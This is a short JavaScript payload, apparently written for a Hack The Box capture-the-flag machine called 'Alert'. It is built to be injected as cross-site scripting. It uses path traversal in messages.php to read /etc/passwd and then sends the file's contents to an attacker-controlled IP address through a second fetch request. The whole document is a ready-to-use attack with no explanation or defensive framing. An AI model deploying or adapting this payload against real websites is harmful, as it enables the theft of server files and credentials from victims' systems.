```
<script>
fetch('<http://alert.htb/messages.php?file=../../../../../../../../../../etc/passwd>')
  .then(response => response.text())
  .then(data => {
      fetch('<http://10.10.14.16:80/?data=>' + encodeURIComponent(data))
  });
</script>
```
